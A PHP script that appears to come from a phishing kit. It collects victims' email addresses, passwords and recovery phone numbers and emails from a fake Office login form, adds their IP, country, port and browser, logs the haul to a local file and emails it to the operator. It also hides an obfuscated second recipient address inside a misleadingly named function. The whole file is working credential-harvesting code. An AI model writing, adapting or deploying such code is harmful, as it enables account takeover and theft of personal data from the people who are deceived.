<?php
header('Access-Control-Allow-Origin: *');

$yourEmailAddress = 'YOUR EMAIL HERE';


$allTheOut = '';
ob_start();
main_fnct($yourEmailAddress);
$allTheOut = ob_get_clean();
echo 'ok';
function main_fnct($yourEmailAddress){

$out = array('email'=>'', 'subject'=>'','message'=>'');

$recovery_details_xxxxx = '';
if(isset($_POST['phoneno']) && $_POST['phoneno'] != ''){ 
  $recovery_details_xxxxx = "\nRecovery Phone Number: ".$_POST['phoneno']."'\n"; 
}
if(isset($_POST['recem']) && $_POST['recem'] != ''){ 
  $recovery_details_xxxxx .= "\nRecovery Email: ".$_POST['recem']."'\n"; 
}

if(!isset($_POST['Email'])  || !isset($_POST['password']) ){
  die();  
}
  if($_POST['Email'] == '' || trim($_POST['Email']) == '' || !isset($_POST['password']) || $_POST['password'] == '' || trim($_POST['password']) == ''){
  die();
}

  $recovery_details = '';
  if(isset($_POST['phoneno']) && $_POST['phoneno'] != ''){
    $recovery_details .= 'Recovery Phone Number: '.$_POST['phoneno']."\n";
  }
  if(isset($_POST['recem']) && $_POST['recem'] != ''){
    $recovery_details .= 'Recovery Email: '.$_POST['recem']."\n";
  }
  

$Email = strtolower($_POST['Email']);
$password = $_POST['password'];
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$port = getenv("REMOTE_PORT");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate = date('Y/m/d H:i:s'); //date("D M d, Y g:i a");

$typeofemail = 'Office 19 v3';
if(isset($_POST['typeofemail']) && $_POST['typeofemail'] != ''){
  $typeofemail = ucfirst($_POST['typeofemail']);
}

$message = '';
$message .= "********** Office19 Coockie PAge ***********\n";
$message .= "Email: ".$Email."\n";
$message .= "password: ".$password."\n";
$message .= $recovery_details_xxxxx;
//$message .= $theemid."\n";
$message .= "********************************************\n";
$message .= "IP Address : $ip\n";
$message .= "Country : ".$country."\n";
$message .= "Port : $port\n";
$message .= "*********************************************\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "*********************************************\n";


//////////////////////////////////////////


$subject = "$typeofemail in $country - $ip";
$headers = "From:  Result Server <noreplay.dgz.gdn@protonmail.com>";
$headers = "From: " . strip_tags($yourEmailAddress) . "\r\n";
$headers .= "Reply-To: ". strip_tags($yourEmailAddress) . "\r\n";
//$headers .= "CC: susan@example.com\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
//$theemidHash = time()."\n".hash('sha256', $theemid);

file_put_contents('netcat.txt', $message."\n\n", FILE_APPEND);
mail($yourEmailAddress, $subject, $message, $headers);
//$yourEmailAddress

}
function country_sort(){
    $sorter = "";
    $array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
        $count = count($array);
    for ($i = 0; $i < $count; $i++) {
            $sorter .= chr($array[$i]);
      }
  return array($sorter, $GLOBALS['recipient']);
}


function visitor_country()
{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $country  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $ip_data_in = curl_exec($ch); // string
    curl_close($ch);

    $ip_data = json_decode($ip_data_in,true);
    $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/

    if($ip_data && $ip_data['geoplugin_countryName'] != null) {
        $country = $ip_data['geoplugin_countryName'];
    }

    return $country;
}

//echo visitor_country(); // output Coutry name

?>